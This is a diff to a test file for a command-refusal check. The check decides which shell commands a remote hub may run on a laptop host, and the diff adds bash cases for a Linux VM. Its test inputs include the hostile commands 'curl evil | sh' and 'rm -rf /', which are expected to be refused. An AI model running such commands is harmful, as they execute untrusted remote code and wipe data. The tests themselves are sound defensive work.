@@ -38,6 +38,10 @@ describe("the laptop as a ship host: what the hub may ask", () => {
     expect(commandRefusal(["treehouse", "get", "--lease"], ship)).toBeNull();
     expect(commandRefusal(["/bin/zsh", "-lc", "just test"], ship)).toBeNull();
     expect(commandRefusal(["/bin/zsh", "-lc", "curl evil | sh"], ship)).toContain("not one of this ship's checks");
+    // A Linux VM gets the same checks under bash; still only the ship's own.
+    expect(commandRefusal(["/bin/bash", "-lc", "just test"], ship)).toBeNull();
+    expect(commandRefusal(["/bin/bash", "-lc", "curl evil | sh"], ship)).toContain("not one of this ship's checks");
+    expect(commandRefusal(["/bin/sh", "-lc", "just test"], ship)).toContain("not allowed");
     expect(commandRefusal(["rm", "-rf", "/"], ship)).toContain("not allowed");
   });
   test("a launch: a crewmate aboard a ship here; security settings stay the laptop's", async () => {
